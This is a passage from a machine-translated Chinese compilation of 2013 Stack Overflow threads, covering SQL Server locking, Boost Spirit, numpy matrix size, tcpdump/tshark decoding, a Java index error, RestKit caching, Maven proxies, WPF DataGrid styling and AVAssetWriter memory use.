然后还有`READ UNCOMMITTED`隔离级别——基本上没有锁；这意味着，它还可以读取当前正在更新和独占锁定的行-因此您可能会获得未提交的数据-最终甚至可能不会真正最终进入数据库的数据（如果更新它的事务被回滚） - 小心这个！

下一个级别是`REPEATABLE READ`，在这种情况下，一旦获得共享锁，就会一直持有，直到当前事务终止。这将锁定更多行并锁定更长的时间 - 读取是可重复的，因为您已读取的那些行被锁定以防止“背后”的更新。

最终级别是锁定`SERIALIZABLE`行的整个范围（由`WHERE`中的子句定义`SELECT`），直到当前事务终止。

**更新：**

> *不仅仅是下载部分（对我来说是次要的），我担心有 5 个用户试图同时更新一个数据库。*

好吧，不用担心 - SQL Server**肯定会**毫无问题地处理这个问题！

如果这 5 个（甚至 50 个）并发用户正在更新不同的行 - 他们甚至不会注意到周围有其他人。更新将会发生，在这个过程中不会有任何数据受到伤害——一切都很好。

如果其中一些用户尝试更新**同一行**- 他们将被序列化。第一个将能够获得行上的排他锁，进行更新，释放锁，然后继续。现在第二个用户将得到它的机会 - 获得排他锁，更新数据，释放锁，继续。

当然：如果你**不做任何事情**，第二个用户的数据将简单地覆盖第一个更新。这就是为什么需要并发检查的原因。您应该检查数据在您读取数据和写入数据之间是否发生了变化；如果它已更改，则意味着其他人同时已对其进行了更新->您需要考虑针对这种情况的并发冲突解决策略（但这本身就是另一个问题……）

# c++ - 有没有办法为带有 boost qi 符号的符号表查找指定前缀

> ID：14847455
> 
> 赞同：1
> 
> 时间：2013-02-13T06:07:15.340
> 
> 标签：c++, boost-spirit, boost-spirit-qi

我现在正在处理一个奇怪的案例，我需要在两个不同的上下文中使用相同的符号表。在“J”命令的情况下，我只想查看符号表中以特定前缀开头的元素，但是这个前缀不会在解析的文本中指定，而仅用于在符号表。

我当前的解决方案是在解析器之外循环遍历符号表，生成专门用于此“J”命令的第二个符号表，但我很好奇是否有办法将其组合到解析器中。

目前，以下玩具代码导致 100,10,10 ，是否对 myRule 中的第一个 symTable 引用进行了相当容易的修改，以便将其解析为 100,10,1？

```
#define BOOST_SPIRIT_USE_PHOENIX_V3
#include <boost/spirit/include/qi.hpp>
#include <boost/spirit/include/phoenix.hpp>
#include <boost/spirit/include/qi_symbols.hpp>
#include <boost/foreach.hpp>
#include <string>
#include <vector>
#include <iostream>

namespace qi = boost::spirit::qi;
namespace phx = boost::phoenix;

int main() {
    qi::symbols<char, unsigned int> symTable;
    symTable.add("prefix_A", 1)
                ("A"       , 10);
    qi::rule<std::string::const_iterator, unsigned int()> xRule = qi::lit("X")[qi::_val = 100];
    qi::rule<std::string::const_iterator, unsigned int()> myRule =
                      (qi::lit("J") >> qi::omit[+qi::space] >> symTable/*("prefix_")*/)
                    | (qi::lit("R") >> qi::omit[+qi::space] >> symTable)
                    | xRule;

    std::string test = "X;R A;J A";
    std::string::const_iterator it= test.begin();
    std::string::const_iterator end= test.end();
    std::vector<unsigned int> results;

    if (!qi::parse(it, end, (myRule % ";"), results))
        std::cout << "Parse Failed\n";
    else {
        BOOST_FOREACH(unsigned int x, results)
            std::cout << x << ",";
        if(it != end)
            std::cout << "\nIncomplete Parse\n";
        else
            std::cout << "\nParsed\n";
    }
    return 0;
} 
```

# python - 如何在 python 中找到 numpy 矩阵的长度（或尺寸、大小）？

> ID：14847457
> 
> 赞同：160
> 
> 时间：2013-02-13T06:07:24.577
> 
> 标签：python, matrix, numpy

对于python中的numpy矩阵

```
from numpy import matrix
A = matrix([[1,2],[3,4]]) 
```

我怎样才能找到这个矩阵的行（或列）的长度？等效地，我如何知道行数或列数？

到目前为止，我发现的唯一解决方案是：

```
len(A)
len(A[:,1])
len(A[1,:]) 
```

分别返回 2、2 和 1。从这里我收集到的`len()`将返回行数，所以我总是可以使用转置`len(A.T)`来表示列数。但是，这让人感到不满意和随意，因为在阅读 line 时`len(A)`，这应该返回行数并不是很明显。它实际上与 2D python 数组的工作方式不同`len([1,2])`，因为这将返回 2。

那么，是否有更直观的方法来查找矩阵的大小，或者这是我拥有的最好的方法？

* * *

## 回答 #1

> 赞同：271
> 
> 时间：2013-02-13T06:07:24.577

`shape`是 numpy ndarray 和矩阵的属性。

```
A.shape 
```

将返回一个元组 (m, n)，其中 m 是行数，n 是列数。

事实上，numpy`matrix`对象是建立在对象之上的`ndarray`，它是 numpy 的两个基本对象之一（以及一个通用函数对象），因此它继承自`ndarray`

* * *

## 回答 #2

> 赞同：40
> 
> 时间：2013-02-13T06:12:09.003

`matrix.size`根据[numpy docs](http://docs.scipy.org/doc/numpy/reference/arrays.ndarray.html#array-methods)返回`Number of elements in the array.`有帮助的希望。

# shell - 使用 tcpdump 从命令行读取捕获的数据包

> ID：14847458
> 
> 赞同：3
> 
> 时间：2013-02-13T06:07:26.467
> 
> 标签：shell, tcpdump, ipsec

我正在使用以下方法捕获流量：

```
 tcpdump -i <interface> -nn  -s0 -w ike2.pcap 
```

然后我正在使用以下方法读取捕获的文件：

```
tcpdump  -vvv -l -r ike2.pcap 
```

读取时，第一个数据包显示为：

```
07:22:33.320142 IP (tos 0x0, ttl  64, id 0, offset 0, flags [DF], length: 296) 10.0.0.1.isakmp > 10.0.0.2.isakmp: [udp sum ok] isakmp 2.0 msgid  cookie ->: phase 1 I #34[]:
    (#33)
    (#34)
    (#40)
    (#41)
    (#41) 
```

我需要获取此数据包的详细信息。在这个 ISAKMP IKEv2 数据包中，我有兴趣提取“加密算法”和“完整性算法”的值（即“ENCR_3DES”和“AUTH_HMAC_MD5_96”）

如果我在 Wireshark 中检查数据包，我可以查看这些值。但是，我必须从 shell 脚本执行此操作，所以我不能使用wireshark。我需要从 tcpdump 读取命令本身获取这些值。

我假设可能有某种方法可以打印 tcpdump 读取命令中使用的加密和完整性算法。你能帮忙解决这个问题吗？

捕获的数据包：

![捕获的数据包](../Images/93effa387ca313f681adc9b093f44a93.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2017-11-08T15:27:28.397

**只需tcpdump**就可以按照您的期望找到方法，但是 @user862787 说使用 tshark 如下：

```
# tshark -V -r somecapfile.pcap
Frame 1: 196 bytes on wire (1568 bits), 196 bytes captured (1568 bits)
Encapsulation type: Linux cooked-mode capture (25)
Arrival Time: May 10, 2017 02:00:34.811347000 CDT
[Time shift for this packet: 0.000000000 seconds]
Epoch Time: 1494399634.811347000 seconds
[Time delta from previous captured frame: 0.000000000 seconds]
[Time delta from previous displayed frame: 0.000000000 seconds]
[Time since reference or first frame: 0.000000000 seconds]
Frame Number: 1
Frame Length: 196 bytes (1568 bits)
Capture Length: 196 bytes (1568 bits)
[Frame is marked: False]
[Frame is ignored: False]
[Protocols in frame: sll:ethertype:ip:sctp:m3ua:sccp:tcap:gsm_map] 
```

-V 做你想做的事！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T19:59:36.437

> 如果我在 Wireshark 中检查数据包，我可以查看这些值。但是，我必须从 shell 脚本执行此操作，所以我不能使用wireshark。

但是您也许可以使用 TShark。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-05-26T22:10:22.400

tcpdump -r 带有一些其他标志（例如 -X）的文件。

# java - 麻烦拍摄 java.lang.ArrayIndexOutOfBoundsException

> ID：14847460
> 
> 赞同：1
> 
> 时间：2013-02-13T06:07:28.353
> 
> 标签：java, indexoutofboundsexception

嗨朋友们，我正在为句子之间的语义相似性做最后一年的项目。所以我使用 word-net 2.1 数据库来检索含义。每行我都必须拆分单词。在每个单词中，我都获得了含义并将其存储到数组中。但它只能得到第一句话的含义。

```
 String[] sentences = result.split("[\\.\\!\\?]");
 for (int i=0;i<sentences.length;i++)
             {  
                 System.out.println(i);
              System.out.println(sentences[i]);
              int wcount1 = sentences[i].split("\\s+").length;
              System.out.println(wcount1);int wcount1=wordCount(w2);
            System.out.println(wcount1);
        String[] word1 = sentences[i].split(" ");
        for (int j=0;j<wcount1;j++){  
            System.out.println(j);

         System.out.println(word1[j]);
     }
          }

         IndexWordSet set = wordnet.lookupAllIndexWords(word1[j]); 
         System.out.println(set);
         IndexWord[] ws = set.getIndexWordArray(); 

         **POS p = ws[0].getPOS();///line no 103**

         Set<String> synonyms = new HashSet<String>();
         IndexWord indexWord = wordnet.lookupIndexWord(p, word1[j]);
         Synset[] synSets = indexWord.getSenses();
         for (Synset synset : synSets)
         {
            Word[] words = synset.getWords();

            for (Word word : words)
            {
               synonyms.add(word.getLemma());
            }
         }
         System.out.println(synonyms); 
```

输出：只有`sentences[o]`（第一句单词的唯一含义......所有其他单词都没有循环......）它显示这个错误..

```
**java.lang.ArrayIndexOutOfBoundsException: 0
at first_JWNL.main(first_JWNL.java:102)** 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T06:44:03.077

当你声明变量`wcount1`时，你在值中赋值：`sentences[i].split("\\s+")..`。然而，当您分配变量时`word1`，它被分配了`sentences[i].split(" ")`。

是否有可能，因为您使用了两个正则表达式，第二个拆分（分配给`word1`变量）没有正确拆分？因此，当您访问值 ( `System.out.println(word1[j]);`) 时，它会抛出`ArrayIndexOutOfBoundsException`. 由于 的值`wcount1`可能大于 的长度`word1`。

# ios - RestKit 0.20.0-rc1 mappingResult 304 Not Modified后为空

> ID：14847461
> 
> 赞同：2
> 
> 时间：2013-02-13T06:07:42.330
> 
> 标签：ios, api, restkit

我有一个指向 Rails 支持的 API 的简单客户端应用程序。它获取非托管对象，如下所示：

```
[[RKObjectManager sharedManager] getObjectsAtPath:@"places" params:nil success:...] 
```

我面临的问题是 RestKit 在刷新后不执行任何映射，因为响应是 304 Not Modified。

但是，在检查 operation.HTTPRequestOperation.responseData 时有一个 JSON 有效负载。即使响应是 304 Not Modified，我如何让 restkit 映射。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-28T06:41:56.823

只是在我的项目中遇到同样的问题。

看起来在 RestKit 0.20 中缓存被完全重新设计（实际上它被删除了，看 github issue #209）。现在，当收到 NOT MODIFIED 响应时，它[不会解析](https://github.com/RestKit/RestKit/blob/490b233daf47485ba6f9d6bd7fd2d7685afc34b2/Code/Network/RKManagedObjectRequestOperation.m#L373)缓存的响应正文。相反，它尝试使用所谓的“RKFetchRequestBlock”从持久存储中加载对象。您可以在此处阅读更多信息：[http ://restkit.org/api/latest/Classes/RKManagedObjectRequestOperation.html](http://restkit.org/api/latest/Classes/RKManagedObjectRequestOperation.html)

因此，您需要为每个可以返回 304 响应的 URL 添加 RKFetchRequestBlock。另一种选择是禁用 NSURLCaching，这在 RestKit 0.20 中并非易事。我使用以下代码：

ELObjectManager.h

```
@interface RKObjectManager ()
// So we can call [super requestWithMethod:...]
- (NSMutableURLRequest *)requestWithMethod:(NSString *)method
                                      path:(NSString *)path
                                parameters:(NSDictionary *)parameters;

@end

@interface ELObjectManager : RKObjectManager
@end 
```

ELObjectManager.m

```
#import "ELObjectManager.h"

@implementation ELObjectManager

- (NSMutableURLRequest *)requestWithMethod:(NSString *)method
                                      path:(NSString *)path
                                parameters:(NSDictionary *)parameters
{
    NSMutableURLRequest* request = [super requestWithMethod:method path:path parameters:parameters];
    request.cachePolicy = NSURLRequestReloadIgnoringLocalAndRemoteCacheData;
    return request;
}

@end 
```

然后用这个类代替 RKObjectManager

```
[RKObjectManager setSharedManager:[ELObjectManager managerWithBaseURL:...] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T23:44:29.133

我遇到了同样的问题，更糟糕的是服务器状态码实际上是200而不是304。mappingResult也是null，实际数据可以在原始帖子中的operation.HTTPRequestOperation.responseData中找到。我正在运行 0.20.0。请让我知道是否有适合我的解决方法。

下面显示了即使状态码为 200 的 mappingResult 为空。responseData 太长，无法发布。我也在使用 RestKit 的核心数据集成。

```
2013-04-25 16:38:14.244 MyApp[58584:c07] I restkit.network:RKHTTPRequestOperation.m:185 GET 'http://localhost:3000/api/search?access_token=3ad3b8c4a5fed9503a80c1f6afebab47&keywords=art' (200 OK) [0.0047 s]
(lldb) po mappingResult
$0 = 0x079a1880 <RKMappingResult: 0xac64c80, results={
    "<null>" =     (
    );
}>
(lldb) po operation
$1 = 0x07995fd0 <RKManagedObjectRequestOperation: 0x7995fd0, state: Successful, isCancelled=NO, request: <NSMutableURLRequest http://localhost:3000/api/search?access_token=3ad3b8c4a5fed9503a80c1f6afebab47&keywords=art>, response: <NSHTTPURLResponse: 0x7e51fc0 statusCode=200 MIMEType=application/json length=58781>>
(lldb) 
```

# java - 局域网上的 Maven 设置

> ID：14847462
> 
> 赞同：0
> 
> 时间：2013-02-13T06:07:42.550
> 
> 标签：java, maven

我想使用 vmmagent-0.6.5 jar 文件。vmmagent 是 maven 项目，依赖于许多其他 jar 文件。我想在本地设置 Maven 项目并将这个 jar 文件用于参考文件 [Vmmagent maven 代码](http://grepcode.com/snapshot/repo1.maven.org/maven2/org.ow2.jasmine/vmmagent/0.6.5/) 可以在本地设置这个项目，或者我必须通过互联网连接以进行连接，因为我在 pom.xml 文件中看到这一行

```
<scm>
<connection>
scm:svn:svn://svn.forge.objectweb.org/svnroot/jasmine/jasmine-vm/vmm-agent/tags/vmmagent-0.6.5
</connection>
<developerConnection>
scm:svn:svn+ssh://dangtran@svn.forge.objectweb.org/svnroot/jasmine/jasmine-vm/vmm-agent/tags/vmmagent-0.6.5
</developerConnection>
<url>
http://fisheye.jasmine.objectweb.org/browse/JASMINe/jasmine/jasmine-vm/vmm-agent/tags/vmmagent-0.6.5
</url>
</scm> 
```

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T06:59:08.377

您需要设置maven客户端才能使用代理服务器，进入maven目录的settings.xml

并放置这个-

```
<settings>  <proxies>
<proxy>
  <id>genproxy</id>
  <active>true</active>
  <protocol>http</protocol>
  <host>theipofserver</host>
  <port>port</port>
  <username>username</username>
  <password>password</password>
</proxy> 
```

问候安舒尔

# wpf - 想要更改 wpf datagrid 中的单元格背景颜色

> ID：14847463
> 
> 赞同：2
> 
> 时间：2013-02-13T06:07:45.323
> 
> 标签：wpf, wpf-controls, wpfdatagrid

我正在将行与类绑定。

在每个绑定行上，我想根据单元格值更改单元格背景颜色。

```
<DataGrid x:Name="dtstandardview" BorderThickness="0" Height="429"  Width="688" BorderBrush="Aqua" MouseLeftButtonDown="dtstandardview_MouseRightButtonUp_1"
                     GridLinesVisibility="None" MouseRightButtonUp="dtstandardview_MouseRightButtonUp_1" 
                     VerticalScrollBarVisibility="Visible" AutoGenerateColumns="False" IsReadOnly="True" 
                      CanUserDeleteRows="False"  AlternationCount="2" CanUserResizeRows="False" Sorting="dtstandardview_Sorting_1"
                     Background="#DCDCDC" HeadersVisibility="Column" CanUserResizeColumns="False"
                      RowHeight="27" SelectionUnit="FullRow" CanUserAddRows="False" MinRowHeight="27" LoadingRow="dtstandardview_LoadingRow" LoadingRowDetails="dtstandardview_LoadingRowDetails" Loaded="dtstandardview_Loaded" Initialized="dtstandardview_Initialized" CellEditEnding="dtstandardview_CellEditEnding" AutoGeneratingColumn="dtstandardview_AutoGeneratingColumn" UnloadingRow="dtstandardview_UnloadingRow" UnloadingRowDetails="dtstandardview_UnloadingRowDetails" SelectionChanged="dtstandardview_SelectionChanged"    >
                <DataGrid.ItemContainerStyle>
                    <Style TargetType="DataGridRow">
                        <EventSetter Event="Selected" Handler="dataGridRowSelected"/>
                    </Style>
                </DataGrid.ItemContainerStyle>
                <DataGrid.Resources>
                    <SolidColorBrush x:Key="{x:Static SystemColors.HighlightBrushKey}" Color="#FF0000"/>
                </DataGrid.Resources>
                <DataGrid.CellStyle>
                    <Style TargetType="DataGridCell">
                        <Style.Triggers>
                            <Trigger Property="IsSelected"  Value="True">
                                <Setter Property="BorderBrush" Value="#cde0e5" />
                                <Setter Property="Background" Value="#cde0e5" />
                            </Trigger>
                        </Style.Triggers>
                        <Setter Property="Background" Value="Transparent"/>
                        <Setter Property="FontSize" Value="12"/>
                        <Setter Property="FontFamily" Value="Arial"/>
                        <Setter Property="Foreground" Value="#404040"/>
                        <Setter Property="FontWeight" Value="Bold"/>
                        <Setter Property="DataContext">
                            <Setter.Value>
                                <TextBlock Margin="10,0,0,0" TextWrapping="Wrap" Text="{Binding}">
                                    <TextBlock.Effect>
                                        <DropShadowEffect BlurRadius="0" Color="#FF000000" Direction="-60" Opacity="0.32" ShadowDepth="1"/>
                                    </TextBlock.Effect>
                                </TextBlock>
                            </Setter.Value>
                        </Setter>

                        <Setter Property="Margin" Value="10,5" />
                        <Setter Property="VerticalContentAlignment" Value="Bottom"/>

                    </Style>
                </DataGrid.CellStyle>
                <DataGrid.RowStyle>
                    <Style TargetType="DataGridRow">
                        <Setter Property="FontWeight" Value="Bold"/>
                        <Setter Property="FontSize" Value="12"/>
                        <Setter Property="FontFamily" Value="Arial"/>
                        <Setter Property="Foreground" Value="#404040"/>
                        <Setter Property="Background" Value="Transparent"/>
                        <Setter Property="DataContext">
                            <Setter.Value>
                                <TextBlock Margin="10,0,0,0" TextWrapping="Wrap" Text="{Binding}">
                                    <TextBlock.Effect>
                                        <DropShadowEffect BlurRadius="0" Color="#FF000000" Direction="-60" Opacity="0.32" ShadowDepth="1"/>
                                    </TextBlock.Effect>
                                </TextBlock>
                            </Setter.Value>
                        </Setter>
                        <Style.Triggers>
                            <Trigger Property="IsSelected"  Value="True">
                                <!--<Setter Property="BorderBrush" Value="#c7dae0" />
                                            <Setter Property="Background" Value="#c7dae0"></Setter>
                                            <Setter Property="BorderThickness" Value="2" />-->
                                <Setter Property="Template">
                                    <Setter.Value>
                                        <ControlTemplate TargetType="{x:Type DataGridRow}">
                                            <ControlTemplate.Resources>
                                                <Storyboard x:Key="SelectedOn">
                                                    <DoubleAnimationUsingKeyFrames BeginTime="00:00:00" Storyboard.TargetName="select_gradient" Storyboard.TargetProperty="(UIElement.Opacity)">
                                                        <SplineDoubleKeyFrame KeyTime="00:00:00.1000000" Value="1" />
                                                    </DoubleAnimationUsingKeyFrames>
                                                </Storyboard>
                                                <Storyboard x:Key="SelectedOff">
                                                    <DoubleAnimationUsingKeyFrames BeginTime="00:00:00" Storyboard.TargetName="select_gradient" Storyboard.TargetProperty="(UIElement.Opacity)">
                                                        <SplineDoubleKeyFrame KeyTime="00:00:00.3000000" Value="0" />
                                                    </DoubleAnimationUsingKeyFrames>
                                                </Storyboard>
                                                <Storyboard x:Key="HoverOn">
                                                    <DoubleAnimationUsingKeyFrames BeginTime="00:00:00" Storyboard.TargetName="hover_gradient" Storyboard.TargetProperty="(UIElement.Opacity)">
                                                        <SplineDoubleKeyFrame KeyTime="00:00:00.1000000" Value="0.85" />
                                                    </DoubleAnimationUsingKeyFrames>
                                                    <DoubleAnimationUsingKeyFrames BeginTime="00:00:00" Storyboard.TargetName="highlight" Storyboard.TargetProperty="(UIElement.Opacity)">
                                                        <SplineDoubleKeyFrame KeyTime="00:00:00.1000000" Value="0.65" />
                                                    </DoubleAnimationUsingKeyFrames>
                                                </Storyboard>
                                                <Storyboard x:Key="HoverOff">
                                                    <DoubleAnimationUsingKeyFrames BeginTime="00:00:00" Storyboard.TargetName="hover_gradient" Storyboard.TargetProperty="(UIElement.Opacity)">
                                                        <SplineDoubleKeyFrame KeyTime="00:00:00.3000000" Value="0" />
                                                    </DoubleAnimationUsingKeyFrames>
                                                    <DoubleAnimationUsingKeyFrames BeginTime="00:00:00" Storyboard.TargetName="highlight" Storyboard.TargetProperty="(UIElement.Opacity)">
                                                        <SplineDoubleKeyFrame KeyTime="00:00:00.3000000" Value="0" />
                                                    </DoubleAnimationUsingKeyFrames>
                                                </Storyboard>
                                            </ControlTemplate.Resources>
                                            <Border x:Name="DGR_Border" BorderBrush="{TemplateBinding BorderBrush}" BorderThickness="{TemplateBinding BorderThickness}" Background="{TemplateBinding Background}" SnapsToDevicePixels="True">
                                                <SelectiveScrollingGrid>
                                                    <SelectiveScrollingGrid.ColumnDefinitions>
                                                        <ColumnDefinition Width="Auto"/>
                                                        <ColumnDefinition Width="*"/>
                                                    </SelectiveScrollingGrid.ColumnDefinitions>
                                                    <SelectiveScrollingGrid.RowDefinitions>
                                                        <RowDefinition Height="*"/>
                                                        <RowDefinition Height="Auto"/>
                                                    </SelectiveScrollingGrid.RowDefinitions>

                                                    <Rectangle x:Name="hover_gradient"  StrokeThickness="1" RadiusX="1" RadiusY="1" Opacity="0" IsHitTestVisible="False" Grid.Column="1" Fill="{DynamicResource MouseOverBrush}"/>
                                                    <Rectangle x:Name="highlight" Margin="1" StrokeThickness="1" RadiusX="0.5" RadiusY="0.5" Opacity="0" IsHitTestVisible="False" Grid.Column="1" Stroke="{DynamicResource MouseOverHighlightBrush}" Fill="{DynamicResource MouseOverHighlightBrush}"/>
                                                    <Rectangle x:Name="select_gradient" Grid.Row="0" Grid.ColumnSpan="2" StrokeThickness="1" RadiusX="1" RadiusY="1" Opacity="0" IsHitTestVisible="False" Fill="{DynamicResource PressedBrush}" Stroke="{DynamicResource PressedBorderBrush}"/>

                                                    <DataGridCellsPresenter Grid.Column="1" ItemsPanel="{TemplateBinding ItemsPanel}" SnapsToDevicePixels="{TemplateBinding SnapsToDevicePixels}"/>
                                                    <DataGridDetailsPresenter Grid.Column="1" Grid.Row="1" SelectiveScrollingGrid.SelectiveScrollingOrientation="{Binding AreRowDetailsFrozen, ConverterParameter={x:Static SelectiveScrollingOrientation.Vertical}, Converter={x:Static DataGrid.RowDetailsScrollingConverter}, RelativeSource={RelativeSource AncestorType={x:Type DataGrid}}}" Visibility="{TemplateBinding DetailsVisibility}"/>
                                                    <DataGridRowHeader Grid.RowSpan="2" SelectiveScrollingGrid.SelectiveScrollingOrientation="Vertical" Visibility="{Binding HeadersVisibility, ConverterParameter={x:Static DataGridHeadersVisibility.Row}, Converter={x:Static DataGrid.HeadersVisibilityConverter}, RelativeSource={RelativeSource AncestorType={x:Type DataGrid}}}"/>

                                                </SelectiveScrollingGrid>
                                            </Border>
                                            <ControlTemplate.Triggers>
                                                <Trigger Property="IsMouseOver" Value="True" SourceName="DGR_Border">
                                                    <Trigger.ExitActions>
                                                        <BeginStoryboard Storyboard="{StaticResource HoverOff}" x:Name="HoverOff_BeginStoryboard" />
                                                    </Trigger.ExitActions>
                                                    <Trigger.EnterActions>
                                                        <BeginStoryboard Storyboard="{StaticResource HoverOn}" x:Name="HoverOn_BeginStoryboard" />
                                                    </Trigger.EnterActions>
                                                </Trigger>
                                                <Trigger Property="IsSelected" Value="true">
                                                    <Trigger.ExitActions>
                                                        <BeginStoryboard x:Name="SelectedOff_BeginStoryboard" Storyboard="{StaticResource SelectedOff}" />
                                                    </Trigger.ExitActions>
                                                    <Trigger.EnterActions>
                                                        <BeginStoryboard Storyboard="{StaticResource SelectedOn}" />
                                                    </Trigger.EnterActions>
                                                </Trigger>
                                            </ControlTemplate.Triggers>
                                        </ControlTemplate>
                                    </Setter.Value>
                                </Setter>
                            </Trigger>

                        </Style.Triggers>

                    </Style>
                </DataGrid.RowStyle>
                <DataGrid.RowBackground >
                    <ImageBrush ImageSource="/ClientApplication;component/Images/second_row_bg.png"/>
                </DataGrid.RowBackground>
                <DataGrid.AlternatingRowBackground>
                    <ImageBrush ImageSource="/ClientApplication;component/Images/bonus_progress_bg.png"/>
                </DataGrid.AlternatingRowBackground>

                <DataGrid.ColumnHeaderStyle>
                    <Style TargetType="{x:Type DataGridColumnHeader}">
                        <Setter Property="VerticalContentAlignment" Value="Center" />
                        <Setter Property="ContentTemplate" >
                            <Setter.Value>
                                <DataTemplate>
                                    <TextBlock Foreground="#404040" FontWeight="Bold" Margin="10,0,0,0" TextWrapping="Wrap" Text="{Binding}" TextOptions.TextFormattingMode="Display">
                                        <TextBlock.Effect>
                                            <DropShadowEffect BlurRadius="0" Color="#FFFFFF" Direction="-90" Opacity="0.40" ShadowDepth="1"  RenderOptions.ClearTypeHint="Auto" />
                                        </TextBlock.Effect>
                                    </TextBlock>

                                </DataTemplate>
                            </Setter.Value>
                        </Setter>

                        <Setter Property="Background">
                            <Setter.Value>
                                <ImageBrush ImageSource="/ClientApplication;component/Images/table_bg_header.png"/>
                            </Setter.Value>
                        </Setter>
                        <Setter Property="BorderBrush">
                            <Setter.Value>
                                <ImageBrush   ImageSource="/ClientApplication;component/Images/titel_bg.png"/>
                            </Setter.Value>
                        </Setter>

                        <Setter Property="Foreground" Value="#404040" />
                        <Setter Property="BorderThickness" Value="0, 0, 1, 0"/>
                        <Setter Property="Height" Value="26" />
                        <Setter Property="FontSize" Value="14"/>
                        <Setter Property="FontFamily" Value="Arial"/>

                    </Style>
                </DataGrid.ColumnHeaderStyle>

                <DataGrid.Columns>
                    <DataGridTextColumn  Width="125" Header="Table" Binding="{Binding Path=Table}"> 
                    </DataGridTextColumn>
                    <DataGridTextColumn  Width="101"   Header="Stakes" Binding="{Binding Path=Stakes}"  />
                    <DataGridTextColumn  Width="95" Header="Game" Binding="{Binding Path=Game}" />
                    <DataGridTemplateColumn Header="Type" Width="86">
                        <DataGridTemplateColumn.CellTemplate>
                            <DataTemplate x:Name="typedatatempl">
                                <StackPanel Orientation="Horizontal" Name="stackpaneltype">
                                    <TextBlock Name="typedate"  Text="{Binding Path=Type}" Margin="2,0,0,2" />

                                    <TextBlock Name="txtblocknumber" Text="{Binding Path=number}" Margin="2, 0, 0, 2" Background="Gray" TextAlignment="Center" FontFamily="Arial" FontWeight="Bold" FontSize="10" Foreground="White" Height="13" Width="13" VerticalAlignment="Center" HorizontalAlignment="Center" />
                                    <TextBlock Name="txtblockalpha"  Text="{Binding Path=alphabate}" Margin="5,0,0,2" Background="Transparent" FontFamily="Arial" TextAlignment="Center" FontWeight="Bold" FontSize="10" Foreground="White" Height="13" Width="13" VerticalAlignment="Center"  HorizontalAlignment="Center"/>
                                </StackPanel>
                            </DataTemplate>
                        </DataGridTemplateColumn.CellTemplate>
                    </DataGridTemplateColumn>
                    <DataGridTextColumn  Width="83" Header="Players" Binding="{Binding Path=Players}"  />
                    <DataGridTextColumn  Width="117" Header="Average Pot" Binding="{Binding Path=Average}"   />
                    <DataGridTextColumn  Width="63" Header="H/Hr" Binding="{Binding Path=hhr}"  />
                </DataGrid.Columns>

            </DataGrid> 
```

如何根据值更改单元格的背面颜色。

我在 dtstandardview_LoadingRow 事件上做了，但没有工作。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-13T06:15:58.410

在你的`Triggers`收藏上`DataGridCell` `Style`添加以下内容

```
<DataGrid ItemsSource="{Binding Items}">
    <DataGrid.CellStyle>
        <Style TargetType="{x:Type DataGridCell}">
            <Style.Triggers>
                <DataTrigger Binding="{Binding Path=Value}" Value="true">
                    <Setter Property="Background" Value="Red" />
                </DataTrigger>
            </Style.Triggers>
        </Style>
    </DataGrid.CellStyle>
</DataGrid> 
```

这将是您的视图模型和实体类

```
public class MyViewModel
{
    public MainWindow()
    {
        DataContext = this;
        Items =
            new ObservableCollection<MyEntity>
            {
                new MyEntity(true),
                new MyEntity(false),
                new MyEntity(true)
            };
    }

    public ObservableCollection<MyEntity> Items { get; set; }
}

public class MyEntity
{
    public MyEntity(bool value)
    {
        Value = value;
    }

    public bool Value { get; set; }
} 
```

# ios - 带有音频 AVAssetWriterInput 的 appendSampleBuffer “泄漏”内存直到 endSessionAtSourceTime

> ID：14847466
> 
> 赞同：18
> 
> 时间：2013-02-13T06:07:58.913
> 
> 标签：ios, objective-c, memory-leaks, audio-recording, avassetwriter

我有一个奇怪的内存“泄漏” `AVAssetWriterInput appendSampleBuffer`。我同时写视频和音频，所以我有一个`AVAssetWriter`有两个输入，一个用于视频，一个用于音频：

```
self.videoWriter = [[[AVAssetWriter alloc] initWithURL:[self.currentVideo currentVideoClipLocalURL]
                                              fileType:AVFileTypeMPEG4
                                                 error:&error] autorelease];
...
self.videoWriterInput = [AVAssetWriterInput assetWriterInputWithMediaType:AVMediaTypeVideo
                                                           outputSettings:videoSettings];
self.videoWriterInput.expectsMediaDataInRealTime = YES;
[self.videoWriter addInput:self.videoWriterInput];
...
self.audioWriterInput = [AVAssetWriterInput assetWriterInputWithMediaType:AVMediaTypeAudio
                                                           outputSettings:audioSettings];
self.audioWriterInput.expectsMediaDataInRealTime = YES;
[self.videoWriter addInput:self.audioWriterInput]; 
```

我开始写作，表面上一切正常。视频和音频被写入并对齐等。但是，我将代码放入分配工具并注意到以下内容：

![CoreMedia 分配](../Images/af78f8ed2b756c74f843dbab59b5df6a.png)

音频字节被保留在内存中，我稍后会证明。这就是内存的增长。音频字节仅在我调用 后才被释放`[self.videoWriter endSessionAtSourceTime:...]`，您认为这是内存使用量的急剧下降。这是我的音频编写代码，它作为一个块发送到串行队列中：

```
@autoreleasepool
{
    // The objects that will hold the audio data
    CMSampleBufferRef sampleBuffer;
    CMBlockBufferRef  blockBuffer1;
    CMBlockBufferRef  blockBuffer2;

    size_t nbytes = numSamples * asbd_.mBytesPerPacket;

    OSStatus status = noErr;
    status = CMBlockBufferCreateWithMemoryBlock(kCFAllocatorDefault,
                                                data,
                                                nbytes,
                                                kCFAllocatorNull,
                                                NULL,
                                                0,
                                                nbytes,
                                                kCMBlockBufferAssureMemoryNowFlag,
                                                &blockBuffer1);

    if (status != noErr)
    {
        NLog(@"CMBlockBufferCreateWithMemoryBlock error at buffer 1");
        return;
    }

    status = CMBlockBufferCreateContiguous(kCFAllocatorDefault,
                                           blockBuffer1,
                                           kCFAllocatorDefault,
                                           NULL,
                                           0,
                                           nbytes,
                                           kCMBlockBufferAssureMemoryNowFlag | kCMBlockBufferAlwaysCopyDataFlag,
                                           &blockBuffer2);

    if (status != noErr)
    {
        NSLog(@"CMBlockBufferCreateWithMemoryBlock error at buffer 2");
        CFRelease(blockBuffer1);
        return;
    }

    // Finally, create the CMSampleBufferRef
    status = CMAudioSampleBufferCreateWithPacketDescriptions(kCFAllocatorDefault,
